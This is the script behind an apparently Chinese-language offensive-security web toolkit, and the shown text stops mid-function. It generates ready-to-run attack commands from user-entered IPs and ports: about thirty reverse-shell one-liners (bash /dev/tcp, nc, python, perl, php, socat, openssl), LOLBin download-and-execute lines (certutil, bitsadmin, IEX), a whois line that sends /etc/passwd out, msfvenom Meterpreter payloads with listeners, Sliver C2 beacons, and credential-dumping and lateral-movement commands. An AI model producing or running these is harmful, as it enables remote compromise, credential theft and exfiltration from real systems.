document.addEventListener('DOMContentLoaded', function() {
    // 表单提交事件监听
    const forms = {
        'shellForm': generateShellCommands,
        'downloadForm': generateDownloadCommands,
        'msfvenomForm': generateMsfvenomCommand,
        'impacketForm': generateImpacketCommand,
        'cmeForm': generateCmeCommand,
        'nxcForm': generateNxcCommand
    };

    Object.entries(forms).forEach(([formId, handler]) => {
        const form = document.getElementById(formId);
        if (form) {
            form.addEventListener('submit', function(event) {
                event.preventDefault();
                handler();
            });
        }
    });

    // 导航链接点击事件监听
    const navLinks = {
        'infoGeneratorLink': 'infoGenerator',
        'decoderToolLink': 'decoderTool',
        'webPenetrationLink': 'webPenetration',
        'k8sLink': 'k8s',
        'c2Link': 'c2',
        'reverseShellLink': 'reverseShell',
        'fileDownloadLink': 'fileDownload',
        'traceCleanLink': 'traceClean',
        'systemInfoLink': 'systemInfo',
        'lateralMovementLink': 'lateralMovement',
        'incidentResponseLink': 'incidentResponse'
    };

    Object.entries(navLinks).forEach(([linkId, sectionId]) => {
        const link = document.getElementById(linkId);
        if (link) {
            link.addEventListener('click', function(e) {
                e.preventDefault();
                hideAllSections();
                const targetSection = document.getElementById(sectionId);
                if (targetSection) {
                    targetSection.classList.add('active');
                }
            });
        }
    });

    // 内网信息收集和横向移动选项卡切换功能
    initTabSwitcher('.tabButton');

    // 复制按钮事件监听
    document.querySelectorAll('.serverOptions .copyBtn').forEach(button => {
        button.addEventListener('click', function() {
            const textToCopy = this.getAttribute('data-command');
            if (textToCopy) {
                copyToClipboard(textToCopy, this);
            }
        });
    });

    // XSS Payload复制功能
    document.querySelectorAll('.xssPayloads pre code').forEach(codeBlock => {
        codeBlock.addEventListener('click', function() {
            const text = this.textContent;
            copyToClipboard(text, this.parentElement);
        });
    });

    // Payload类别选择事件监听
    const payloadCategory = document.getElementById('payloadCategory');
    if (payloadCategory) {
        payloadCategory.addEventListener('change', function() {
            const platform = document.getElementById('payloadPlatform');
            const archSelect = document.getElementById('architecture');
            platform.innerHTML = '<option value="">请选择目标平台</option>';
            
            const platforms = {
                'payload': ['Windows', 'Linux', 'Mac', 'Android'],
                'shellcode': ['Windows', 'Linux', 'Mac'],
                'webshell': ['PHP', 'ASP', 'ASPX', 'JSP', 'WAR'],
                'script': ['Go', 'Golang', 'Hex', 'Java', 'Nim', 'Nimlang', 'Perl', 'PL', 'PowerShell', 'PS1', 'Python', 'PY', 'Raw', 'Ruby', 'RB', 'Rust', 'Rustlang', 'SH', 'VBApplication', 'VBScript']
            };

            if (this.value === 'payload' || this.value === 'shellcode') {
                archSelect.style.display = 'block';
                archSelect.required = true;
            } else {
                archSelect.style.display = 'none';
                archSelect.required = false;
            }

            if (this.value && platforms[this.value]) {
                platforms[this.value].forEach(p => {
                    platform.add(new Option(p, p.toLowerCase()));
                });
            }
        });
    }

    // 主题切换按钮事件监听
    const themeToggle = document.getElementById('themeToggle');
    if (themeToggle) {
        themeToggle.addEventListener('click', function() {
            document.body.classList.toggle('dark-theme');
            const isDark = document.body.classList.contains('dark-theme');
            localStorage.setItem('theme', isDark ? 'dark' : 'light');
            this.textContent = isDark ? '☀️ 切换主题' : '🌙 切换主题';
        });
    }

    // 检查保存的主题偏好
    const savedTheme = localStorage.getItem('theme');
    if (savedTheme === 'dark') {
        document.body.classList.add('dark-theme');
        if (themeToggle) {
            themeToggle.textContent = '☀️ 切换主题';
        }
    }

    // 默认显示系统配置部分
    showSection('systemConfig');

    initDecoderTool();

    // NXC操作类型选择事件监听
    const nxcActionType = document.getElementById('nxcActionType');
    const nxcCredentialType = document.getElementById('nxcCredentialType');
    
    if (nxcActionType) {
        nxcActionType.addEventListener('change', function() {
            const commandGroup = document.getElementById('nxcCommandGroup');
            const transferGroups = document.querySelectorAll('.nxcTransferGroup');
            const credentialGroup = document.querySelector('.nxcCredentialGroup');
            const userForNtdsGroup = document.querySelector('.nxcUserForNtds');
            const moduleGroup = document.querySelector('.nxcModuleGroup');
            const moduleOptionsGroup = document.querySelector('.nxcModuleOptions');
            const otherOpsGroup = document.querySelector('.nxcOtherOpsGroup');
            
            // 隐藏所有特殊选项
            [commandGroup, credentialGroup, userForNtdsGroup, moduleGroup, moduleOptionsGroup, otherOpsGroup].forEach(el => {
                if (el) el.style.display = 'none';
            });
            
            transferGroups.forEach(el => {
                el.style.display = 'none';
            });
            
            // 根据选择显示相应选项
            switch(this.value) {
                case 'execCommand':
                    if (commandGroup) commandGroup.style.display = 'block';
                    break;
                case 'fileTransfer':
                    transferGroups.forEach(el => {
                        el.style.display = 'block';
                    });
                    break;
                case 'dumpCredentials':
                    if (credentialGroup) credentialGroup.style.display = 'block';
                    break;
                case 'loadModule':
                    if (moduleGroup) moduleGroup.style.display = 'block';
                    if (moduleOptionsGroup) moduleOptionsGroup.style.display = 'block';
                    break;
                case 'passwordSpray':
                    // 密码喷洒不需要额外选项
                    break;
                case 'otherOps':
                    if (otherOpsGroup) otherOpsGroup.style.display = 'block';
                    break;
            }
        });
    }
    
    if (nxcCredentialType) {
        nxcCredentialType.addEventListener('change', function() {
            const userForNtdsGroup = document.querySelector('.nxcUserForNtds');
            if (userForNtdsGroup) {
                userForNtdsGroup.style.display = this.value === '--ntds-user' ? 'block' : 'none';
            }
        });
    }
    
    // Impacket操作类型选择事件监听
    const impacketActionType = document.getElementById('impacketActionType');
    
    if (impacketActionType) {
        impacketActionType.addEventListener('change', function() {
            const commandGroup = document.querySelector('.impacketCommandGroup');
            const shellGroup = document.querySelector('.impacketShellGroup');
            
            // 隐藏所有选项
            [commandGroup, shellGroup].forEach(el => {
                if (el) el.style.display = 'none';
            });
            
            // 根据操作类型显示相应选项
            switch(this.value) {
                case 'execCommand':
                    if (commandGroup) commandGroup.style.display = 'block';
                    break;
                    
                case 'interactiveShell':
                    if (shellGroup) shellGroup.style.display = 'block';
                    break;
                    
                case 'dumpCredentials':
                    // 凭据转储不需要额外选项
                    break;
            }
        });
    }
    
    // 监听Impacket工具选择变化
    const impacketTool = document.getElementById('impacketTool');
    if (impacketTool) {
        impacketTool.addEventListener('change', function() {
            const actionType = document.getElementById('impacketActionType');
            const withOutputGroup = document.getElementById('withOutputGroup');
            
            // 隐藏命令输出选项
            if (withOutputGroup) {
                withOutputGroup.style.display = 'none';
            }
            
            if (actionType && actionType.value === 'execCommand') {
                const commandGroup = document.querySelector('.impacketCommandGroup');
                if (commandGroup) {
                    commandGroup.style.display = 'block';
                }
                
                // 如果选择的是atexec或wmiexec-pro工具，显示命令输出选项
                if ((this.value === 'atexec' || this.value === 'wmiexec-pro') && withOutputGroup) {
                    withOutputGroup.style.display = 'block';
                }
            }
        });
    }
    
    // 监听Impacket操作类型变化，更新withOutputGroup显示
    if (impacketActionType) {
        impacketActionType.addEventListener('change', function() {
            const withOutputGroup = document.getElementById('withOutputGroup');
            const tool = document.getElementById('impacketTool');
            
            // 如果选择的是执行命令操作且工具是atexec或wmiexec-pro，显示命令输出选项
            if (withOutputGroup && tool) {
                withOutputGroup.style.display = (this.value === 'execCommand' && (tool.value === 'atexec' || tool.value === 'wmiexec-pro')) ? 'block' : 'none';
            }
        });
    }
    
    // CME操作类型选择事件监听
    const cmeActionType = document.getElementById('cmeActionType');
    
    if (cmeActionType) {
        cmeActionType.addEventListener('change', function() {
            const commandGroup = document.querySelector('.cmeCommandGroup');
            const enumGroup = document.querySelector('.cmeEnumGroup');
            const credGroup = document.querySelector('.cmeCredGroup');
            const protocolOptions = document.querySelector('.cmeProtocolOptions');
            
            // 隐藏所有选项组
            [commandGroup, enumGroup, credGroup, protocolOptions].forEach(el => {
                if (el) el.style.display = 'none';
            });
            
            // 根据选择的操作类型显示相应选项
            switch(this.value) {
                case 'execCommand':
                    if (commandGroup) commandGroup.style.display = 'block';
                    // 如果协议是特定类型，显示协议选项
                    updateProtocolOptions();
                    break;
                    
                case 'enumeration':
                    if (enumGroup) enumGroup.style.display = 'block';
                    // 如果协议是特定类型，显示协议选项
                    updateProtocolOptions();
                    break;
                    
                case 'credential':
                    if (credGroup) credGroup.style.display = 'block';
                    // 如果协议是特定类型，显示协议选项
                    updateProtocolOptions();
                    break;
                    
                case 'bruteforce':
                    // 暴力破解不需要额外选项
                    // 如果协议是特定类型，显示协议选项
                    updateProtocolOptions();
                    break;
            }
        });
    }
    
    // CME协议选择事件监听
    const cmeProtocol = document.getElementById('cmeProtocol');
    
    if (cmeProtocol) {
        cmeProtocol.addEventListener('change', updateProtocolOptions);
    }
    
    // 函数：更新协议特定选项
    function updateProtocolOptions() {
        const protocol = document.getElementById('cmeProtocol');
        const protocolOptions = document.querySelector('.cmeProtocolOptions');
        const protocolSpecific = document.getElementById('cmeProtocolSpecific');
        
        if (protocolOptions && protocolSpecific && protocol) {
            // 清空选项
            protocolSpecific.innerHTML = '<option value="">无特定选项</option>';
            protocolOptions.style.display = 'none';
            
            // 根据选择的协议添加特定选项
            switch(protocol.value) {
                case 'winrm':
                    protocolSpecific.innerHTML += '<option value="--ssl">使用SSL (WinRM)</option>';
                    protocolOptions.style.display = 'block';
                    break;
                    
                case 'ldap':
                    protocolSpecific.innerHTML += '<option value="--kdcHost">KDC主机 (LDAP)</option>';
                    protocolOptions.style.display = 'block';
                    break;
            }
        }
    }

    // 标签页切换事件监听
    document.querySelectorAll('.tabButton').forEach(button => {
        button.addEventListener('click', function() {
            // 获取当前标签组
            const tabGroup = this.closest('.tabHeader');
            if (!tabGroup) return;

            // 移除同组中所有标签的active类
            tabGroup.querySelectorAll('.tabButton').forEach(btn => {
                btn.classList.remove('active');
            });

            // 添加当前标签的active类
            this.classList.add('active');

            // 获取目标内容ID
            const targetId = this.getAttribute('data-target');
            if (!targetId) return;

            // 获取标签内容容器
            const tabContentContainer = tabGroup.parentElement;
            if (!tabContentContainer) return;

            // 移除所有标签内容的active类
            tabContentContainer.querySelectorAll('.tabContent').forEach(content => {
                content.classList.remove('active');
            });

            // 显示目标内容
            const targetContent = document.getElementById(targetId);
            if (targetContent) {
                targetContent.classList.add('active');
                // 重新初始化新显示标签页中的复制按钮
                initializeCopyButtons();
            }
        });
    });

    // 复制SQL注入Payload
    document.querySelectorAll('.sqlInjectionPayloads pre code').forEach(code => {
        code.addEventListener('click', function() {
            const text = this.textContent;
            copyToClipboard(text);
        });
    });

    // 信息生成器功能
    const infoGeneratorLink = document.getElementById('infoGeneratorLink');
    const infoGeneratorSection = document.getElementById('infoGenerator');
    
    // 添加导航事件
    infoGeneratorLink.addEventListener('click', function(e) {
        e.preventDefault();
        hideAllSections();
        infoGeneratorSection.classList.add('active');
    });
    
    // 随机信息生成功能
    const generateRandomInfoBtn = document.getElementById('generateRandomInfo');
    if (generateRandomInfoBtn) {
        generateRandomInfoBtn.addEventListener('click', debouncedGenerateRandomInfo);
    }

    // 信息生成器复制功能
    document.querySelectorAll('.randomResults pre code').forEach(codeBlock => {
        codeBlock.addEventListener('click', function() {
            const text = this.textContent;
            copyToClipboard(text, this.parentElement);
        });
    });

    // K8s模块导航链接
    const k8sLink = document.getElementById('k8sLink');
    if (k8sLink) {
        k8sLink.addEventListener('click', function(e) {
            e.preventDefault();
            showSection('k8s');
        });
    }
    
    // Silver模块导航链接
    const silverLink = document.getElementById('silverLink');
    if (silverLink) {
        silverLink.addEventListener('click', function(e) {
            e.preventDefault();
            showSection('silver');
        });
    }
    
    // K8s配置应用功能
    const applyK8sConfigBtn = document.getElementById('applyK8sConfig');
    if (applyK8sConfigBtn) {
        applyK8sConfigBtn.addEventListener('click', function() {
            const token = document.getElementById('k8sToken').value;
            const url = document.getElementById('k8sUrl').value;
            const podName = document.getElementById('k8sPodName').value;
            const namespace = document.getElementById('k8sNamespace').value;
            
            // 更新所有命令中的变量
            updateK8sCommands(token, url, podName, namespace);
            
            // 显示成功消息
            alert('K8s配置已应用');
        });
    }
    
    // 更新K8s命令中的变量
    function updateK8sCommands(token, url, podName, namespace) {
        // 更新所有包含变量的命令
        const commands = document.querySelectorAll('.k8sCommands pre code');
        commands.forEach(cmd => {
            let cmdText = cmd.innerHTML;
            let plainText = cmd.textContent;
            
            // 替换TOKEN变量
            if (token) {
                cmdText = cmdText.replace(/<span class="variable">TOKEN<\/span>/g, token);
                plainText = plainText.replace(/TOKEN/g, token);
            }
            
            // 替换URL变量
            if (url) {
                cmdText = cmdText.replace(/<span class="variable">URL<\/span>/g, url);
                plainText = plainText.replace(/URL/g, url);
            }
            
            // 替换POD_NAME变量
            if (podName) {
                cmdText = cmdText.replace(/<span class="variable">POD_NAME<\/span>/g, podName);
                plainText = plainText.replace(/POD_NAME/g, podName);
            }
            
            // 替换NAMESPACE变量
            if (namespace) {
                cmdText = cmdText.replace(/<span class="variable">NAMESPACE<\/span>/g, namespace);
                plainText = plainText.replace(/NAMESPACE/g, namespace);
            }
            
            cmd.innerHTML = cmdText;
            
            // 同时更新复制按钮的data-copy属性
            const copyBtn = cmd.parentElement.nextElementSibling;
            if (copyBtn && copyBtn.classList.contains('copyBtn')) {
                copyBtn.setAttribute('data-copy', plainText);
            }
        });
    }

    // K8s模块复制功能
    document.querySelectorAll('.k8sCommands pre code').forEach(codeBlock => {
        codeBlock.addEventListener('click', function() {
            const text = this.textContent;
            copyToClipboard(text, this.parentElement);
        });
    });

    // K8s基础模块复制功能
    document.querySelectorAll('.k8sBasicsContainer pre code').forEach(codeBlock => {
        codeBlock.addEventListener('click', function() {
            const text = this.textContent;
            copyToClipboard(text, this.parentElement);
        });
    });

    // Silver模块相关代码
    const silverForm = document.getElementById('silverForm');
    const silverActionType = document.getElementById('silverActionType');
    const silverTargetOS = document.getElementById('silverTargetOS');
    
    // 显示/隐藏相关表单组
    silverActionType.addEventListener('change', function() {
        const actionType = this.value;
        
        // 隐藏所有特定组
        document.querySelectorAll('.silverServerGroup, .silverClientGroup, .silverListenerGroup, .silverGenerateGroup, .silverSessionGroup, .silverBeaconGroup, .silverOperatorGroup, .silverConfigGroup, .silverSessionGroup, .silverBeaconOptionsGroup').forEach(group => {
            group.style.display = 'none';
        });
        
        // 根据选择显示相关组
        switch(actionType) {
            case 'server':
                document.querySelector('.silverServerGroup').style.display = 'block';
                document.querySelector('.silverOperatorGroup').style.display = 'block';
                break;
            case 'client':
                document.querySelector('.silverClientGroup').style.display = 'block';
                document.querySelector('.silverConfigGroup').style.display = 'block';
                break;
            case 'listener':
                document.querySelector('.silverListenerGroup').style.display = 'block';
                break;
            case 'generate':
                document.querySelector('.silverGenerateGroup').style.display = 'block';
                break;
            case 'session':
                document.querySelector('.silverSessionGroup').style.display = 'block';
                break;
            case 'beacon':
                document.querySelector('.silverBeaconGroup').style.display = 'block';
                document.querySelector('.silverBeaconOptionsGroup').style.display = 'block';
                break;
        }
    });

    // 处理操作系统切换
    silverTargetOS.addEventListener('change', function() {
        const os = this.value;
        // 隐藏所有格式选项
        document.querySelectorAll('.format-options').forEach(el => {
            el.style.display = 'none';
        });
        // 显示对应操作系统的格式选项
        document.getElementById(`${os}Format`).style.display = 'block';
    });
    
    // 处理表单提交
    silverForm.addEventListener('submit', function(e) {
        e.preventDefault();
        
        const actionType = silverActionType.value;
        const lhost = document.getElementById('silverLhost').value;
        const lport = document.getElementById('silverLport').value;
        let command = '';
        
        switch(actionType) {
            case 'server':
                const serverAction = document.getElementById('silverServerAction').value;
                const operatorName = document.getElementById('silverOperatorName').value;
                
                switch(serverAction) {
                    case 'start':
                        command = './silver';
                        break;
                    case 'newOperator':
                        command = `new-operator --name ${operatorName} --lhost ${lhost}`;
                        break;
                    case 'multiplayer':
                        command = 'multiplayer';
                        break;
                }
                break;
                
            case 'client':
                const clientAction = document.getElementById('silverClientAction').value;
                const configFile = document.getElementById('silverConfigFile').value;
                
                switch(clientAction) {
                    case 'import':
                        command = `.\\sliver-client_windows.exe import .\\${configFile}`;
                        break;
                    case 'start':
                        command = '.\\sliver-client_windows.exe';
                        break;
                }
                break;
                
            case 'listener':
                const listenerType = document.getElementById('silverListenerType').value;
                command = `${listenerType} --lhost ${lhost} --lport ${lport}`;
                break;
                
            case 'generate':
                const targetOS = silverTargetOS.value;
                let format;
                switch(targetOS) {
                    case 'windows':
                        format = document.getElementById('silverOutputFormat').value;
                        break;
                    case 'linux':
                        format = document.getElementById('silverLinuxFormat').value;
                        break;
                    case 'mac':
                        format = document.getElementById('silverMacFormat').value;
                        break;
                }
                if (format === 'shellcode') {
                    command = `generate --http ${lhost}:${lport} --os ${targetOS} -f shellcode`;
                } else {
                    command = `generate --http ${lhost}:${lport} --os ${targetOS} -f ${format}`;
                }
                break;
                
            case 'session':
                const sessionID = document.getElementById('silverSessionID').value;
                const sessionAction = document.querySelector('input[name="sessionAction"]:checked').value;
                command = `sessions ${sessionAction === 'kill' ? '-k' : '-i'} ${sessionID}`;
                break;
                
            case 'beacon':
                const beaconFormat = document.getElementById('silverBeaconFormat').value;
                const seconds = document.getElementById('silverBeaconSeconds').value;
                const jitter = document.getElementById('silverBeaconJitter').value;
                command = `generate beacon --http ${lhost}:${lport} --os windows --arch amd64 --format ${beaconFormat} --save ./beacon.exe --seconds ${seconds} --jitter ${jitter}`;
                break;
        }
        
        document.getElementById('silverOutput').textContent = command;
    });
});

function showSection(sectionId) {
    hideAllSections();
    const selectedSection = document.getElementById(sectionId);
    if (selectedSection) {
        selectedSection.classList.add('active');
    }
}

function hideAllSections() {
    document.querySelectorAll('.section').forEach(section => {
        section.classList.remove('active');
    });
}

function generateShellCommands() {
    const ipAddress = document.getElementById('ipAddress').value.trim();
    const port = document.getElementById('port').value.trim();

    if (!ipAddress || !port) {
        alert("请填写完整的IP地址和端口");
        return;
    }

    const commands = `
💥 攻击者主机上执行监听
nc -lvvp ${port}

💥 bash
bash -i >& /dev/tcp/${ipAddress}/${port} 0>&1

💥 bash196 TCP
0<&196;exec 196<>/dev/tcp/${ipAddress}/${port}; sh <&196 >&196 2>&196

💥 bash196 UDP
0<&196;exec 196<>/dev/udp/${ipAddress}/${port}; sh <&196 >&196 2>&196

💥 bash read line
exec 5<>/dev/tcp/${ipAddress}/${port};cat <&5 | while read line; do $line 2>&5 >&5; done

💥 bash5
sh -i 5<> /dev/tcp/${ipAddress}/${port} 0<&5 1>&5 2>&5

💥 bash udp
sh -i >& /dev/udp/${ipAddress}/${port} 0>&1

💥 nc mkfifo
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc ${ipAddress} ${port} >/tmp/f

💥 nc mknod
rm -f /tmp/p;mknod /tmp/p p && nc ${ipAddress} ${port} 0/tmp/

💥 nc -e
nc ${ipAddress} ${port} -e sh

💥 nc |
sh | nc ${ipAddress} ${port} 

💥 nc |2
nc ${ipAddress} ${port} | sh 

💥 nc.exe-e
nc.exe ${ipAddress} ${port} -e sh

💥 busybox nc-e
busybox nc ${ipAddress} ${port} -e sh

💥 nc-c
nc -c sh ${ipAddress} ${port}

💥 ncat -e
ncat ${ipAddress} ${port} -e sh

💥 ncat.exe -e
ncat.exe ${ipAddress} ${port} -e sh

💥 ncat udp
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|ncat -u ${ipAddress} ${port} >/tmp/f

💥 rustcat
rcat ${ipAddress} ${port} -r sh

💥 rustcat udp
rcat ${ipAddress} ${port} -r sh -u

💥 socat
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:${ipAddress}:${port}
💥 socat exec
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:${ipAddress}:${port}

💥 perl
perl -e 'use Socket;$i="${ipAddress}";$p=${port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

💥 python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${ipAddress}",${port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"]);'

💥 python3
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${ipAddress}",${port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"]);'

💥 php
php -r '\$sock=fsockopen("${ipAddress}",${port});exec("/bin/bash -i <&3 >&3 2>&3");'

💥 golang
echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","${ipAddress}:${port}");cmd:=exec.Command("sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go

💥 vlang
echo 'import os' > /tmp/t.v && echo 'fn main() { os.system("nc -e sh ${ipAddress} ${port} 0>&1") }' >> /tmp/t.v && v run /tmp/t.v && rm /tmp/t.v

💥 awk
awk 'BEGIN {s = "/inet/tcp/0/${ipAddress}/${port}"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null

💥 openssl
💥攻击者主机上生成密钥并启用监听
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
openssl s_server -quiet -key key.pem -cert cert.pem -port ${port}
💥目标主机上执行
mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect ${ipAddress}:${port} > /tmp/s; rm /tmp/s`;

    document.getElementById('generatedCommands').textContent = commands;
}

function generateDownloadCommands() {
    const fileUrl = document.getElementById('fileUrl').value.trim();
    const filePath = document.getElementById('filePath').value.trim();
    const type = document.getElementById('downloadType').value;

    if (!fileUrl || !filePath || !type) {
        alert("请填写所有必需的字段");
        return;
    }

    const commands = {
        'powershell_iwr': `powershell.exe -Command "Invoke-WebRequest -Uri '${fileUrl}' -OutFile '${filePath}'"`,
        'powershell_iex': `powershell.exe -Command "IEX(New-Object Net.WebClient).DownloadFile('${fileUrl}', '${filePath}')"`,
        'certutil': `certutil.exe -urlcache -split -f "${fileUrl}" "${filePath}"`,
        'bitsadmin': `bitsadmin /rawreturn /transfer down "${fileUrl}" "${filePath}"`,
        'msiexec': `msiexec /q /i "${fileUrl}"`,
        'odbcconf': `odbcconf /s /a {regsvr ${fileUrl}}`,
        'certreq': `CertReq -Post -config "${fileUrl}" c:\\windows\\win.ini output.txt`,
        'smb': `copy \\\\${fileUrl.split('/')[2]}\\files\\${fileUrl.split('/').pop()} "${filePath}"`,
        'ipc': `copy \\\\${fileUrl.split('/')[2]}\\c$\\${fileUrl.split('/').pop()} "${filePath}"`,
        'wget': `wget "${fileUrl}" -O "${filePath}"`,
        'curl': `curl "${fileUrl}" -o "${filePath}"`,
        'python': `python -c "import urllib2; exec urllib2.urlopen('${fileUrl}').read();"`,
        'whois': `whois -h ${fileUrl.split('/')[2]} -p 8080 \`cat /etc/passwd | base64\``
    };

    const command = commands[type];
    if (command) {
        document.getElementById('downloadCommands').innerHTML = `<pre>${command}</pre>`;
    } else {
        alert('不支持的下载类型');
    }
}

function generateMsfvenomCommand() {
    const payloadCategory = document.getElementById('payloadCategory').value;
    const platform = document.getElementById('payloadPlatform').value;
    const arch = document.getElementById('architecture').value;
    const lhost = document.getElementById('lhost').value;
    const lport = document.getElementById('lport').value;
    const outputFile = document.getElementById('outputFile').value;

    // 验证必填字段
    if (!payloadCategory || !platform || (payloadCategory !== 'webshell' && payloadCategory !== 'script' && !arch) || !lhost || !lport || !outputFile) {
        alert('请填写所有必填字段');
        return;
    }

    let payload = '';
    let format = '';
    let extension = '';
    let listenerCmd = '';

    // 确定输出文件的扩展名
    const fileExtension = outputFile.split('.').pop().toLowerCase();

    // 根据payload类别和平台生成payload
    switch (payloadCategory) {
        case 'payload':
            switch (platform) {
                case 'windows':
                    payload = arch === 'x64' ? 'windows/x64/meterpreter/reverse_tcp' : 'windows/meterpreter/reverse_tcp';
                    format = 'exe';
                    listenerCmd = `use exploit/multi/handler\nset payload ${payload}\nset LHOST ${lhost}\nset LPORT ${lport}\nexploit -j`;
                    break;
                case 'linux':
                    payload = arch === 'x64' ? 'linux/x64/meterpreter/reverse_tcp' : 'linux/x86/meterpreter/reverse_tcp';
                    format = 'elf';
                    listenerCmd = `use exploit/multi/handler\nset payload ${payload}\nset LHOST ${lhost}\nset LPORT ${lport}\nexploit -j`;
                    break;
                case 'mac':
                    payload = 'osx/x64/meterpreter/reverse_tcp';
                    format = 'macho';
                    listenerCmd = `use exploit/multi/handler\nset payload ${payload}\nset LHOST ${lhost}\nset LPORT ${lport}\nexploit -j`;
                    break;
                case 'android':
                    payload = 'android/meterpreter/reverse_tcp';
                    format = 'apk';
                    listenerCmd = `use exploit/multi/handler\nset payload ${payload}\nset LHOST ${lhost}\nset LPORT ${lport}\nexploit -j`;
                    break;
            }
            break;
        case 'shellcode':
            switch (platform) {
                case 'windows':
                    payload = arch === 'x64' ? 'windows/x64/meterpreter/reverse_tcp' : 'windows/meterpreter/reverse_tcp';
                    format = 'c';
                    listenerCmd = `use exploit/multi/handler\nset payload ${payload}\nset LHOST ${lhost}\nset LPORT ${lport}\nexploit -j`;
                    break;
                case 'linux':
                    payload = arch === 'x64' ? 'linux/x64/meterpreter/reverse_tcp' : 'linux/x86/meterpreter/reverse_tcp';
                    format = 'c';
                    listenerCmd = `use exploit/multi/handler\nset payload ${payload}\nset LHOST ${lhost}\nset LPORT ${lport}\nexploit -j`;
                    break;
                case 'mac':
                    payload = 'osx/x64/meterpreter/reverse_tcp';
                    format = 'c';
                    listenerCmd = `use exploit/multi/handler\nset payload ${payload}\nset LHOST ${lhost}\nset LPORT ${lport}\nexploit -j`;
                    break;
            }
            break;
        case 'webshell':
            switch (platform) {
                case 'php':
                    payload = 'php/meterpreter/reverse_tcp';
                    format = 'raw';
                    extension = '.php';
                    listenerCmd = `use exploit/multi/handler\nset payload ${payload}\nset LHOST ${lhost}\nset LPORT ${lport}\nexploit -j`;
                    break;
                case 'asp':
                    payload = 'windows/meterpreter/reverse_tcp';
                    format = 'asp';
                    listenerCmd = `use exploit/multi/handler\nset payload ${payload}\nset LHOST ${lhost}\nset LPORT ${lport}\nexploit -j`;
                    break;
                case 'aspx':
                    payload = 'windows/meterpreter/reverse_tcp';
                    format = 'aspx';
                    listenerCmd = `use exploit/multi/handler\nset payload ${payload}\nset LHOST ${lhost}\nset LPORT ${lport}\nexploit -j`;
                    break;
                case 'jsp':
                    payload = 'java/jsp_shell_reverse_tcp';
                    format = 'raw';
                    extension = '.jsp';
                    listenerCmd = `use exploit/multi/handler\nset payload java/meterpreter/reverse_tcp\nset LHOST ${lhost}\nset LPORT ${lport}\nexploit -j`;
                    break;
                case 'war':
                    payload = 'java/jsp_shell_reverse_tcp';
                    format = 'war';
                    listenerCmd = `use exploit/multi/handler\nset payload java/meterpreter/reverse_tcp\nset LHOST ${lhost}\nset LPORT ${lport}\nexploit -j`;
                    break;
            }
            break;
        case 'script':
            switch (platform) {
                case 'python':
                case 'py':
                    payload = 'python/meterpreter/reverse_tcp';
                    format = 'python';
                    extension = '.py';
                    listenerCmd = `use exploit/multi/handler\nset payload ${payload}\nset LHOST ${lhost}\nset LPORT ${lport}\nexploit -j`;
                    break;
                case 'ruby':
                case 'rb':
                    payload = 'ruby/shell_reverse_tcp';
                    format = 'ruby';
                    extension = '.rb';
                    listenerCmd = `use exploit/multi/handler\nset payload ${payload}\nset LHOST ${lhost}\nset LPORT ${lport}\nexploit -j`;
                    break;
                case 'perl':
                case 'pl':
                    payload = 'cmd/unix/reverse_perl';
                    format = 'perl';
                    extension = '.pl';
                    listenerCmd = `use exploit/multi/handler\nset payload ${payload}\nset LHOST ${lhost}\nset LPORT ${lport}\nexploit -j`;
                    break;
                case 'sh':
                    payload = 'cmd/unix/reverse_bash';
                    format = 'sh';
                    extension = '.sh';
                    listenerCmd = `use exploit/multi/handler\nset payload ${payload}\nset LHOST ${lhost}\nset LPORT ${lport}\nexploit -j`;
                    break;
                case 'powershell':
                case 'ps1':
                    payload = 'windows/powershell_reverse_tcp';
                    format = 'psh';
                    extension = '.ps1';
                    listenerCmd = `use exploit/multi/handler\nset payload ${payload}\nset LHOST ${lhost}\nset LPORT ${lport}\nexploit -j`;
                    break;
                case 'java':
                    payload = 'java/meterpreter/reverse_tcp';
                    format = 'java';
                    extension = '.java';
                    listenerCmd = `use exploit/multi/handler\nset payload ${payload}\nset LHOST ${lhost}\nset LPORT ${lport}\nexploit -j`;
                    break;
                case 'go':
                case 'golang':
                    payload = 'windows/meterpreter/reverse_tcp';
                    format = 'golang';
                    extension = '.go';
                    listenerCmd = `use exploit/multi/handler\nset payload ${payload}\nset LHOST ${lhost}\nset LPORT ${lport}\nexploit -j`;
                    break;
                case 'rust':
                case 'rustlang':
                    payload = 'windows/meterpreter/reverse_tcp';
                    format = 'rust';
                    extension = '.rs';
                    listenerCmd = `use exploit/multi/handler\nset payload ${payload}\nset LHOST ${lhost}\nset LPORT ${lport}\nexploit -j`;
                    break;
                case 'nim':
                case 'nimlang':
                    payload = 'windows/meterpreter/reverse_tcp';
                    format = 'nim';
                    extension = '.nim';
                    listenerCmd = `use exploit/multi/handler\nset payload ${payload}\nset LHOST ${lhost}\nset LPORT ${lport}\nexploit -j`;
                    break;
                case 'vbscript':
                    payload = 'windows/meterpreter/reverse_tcp';
                    format = 'vbs';
                    extension = '.vbs';
                    listenerCmd = `use exploit/multi/handler\nset payload ${payload}\nset LHOST ${lhost}\nset LPORT ${lport}\nexploit -j`;
                    break;
                case 'vbapplication':
                    payload = 'windows/meterpreter/reverse_tcp';
                    format = 'vba';
                    extension = '.vba';
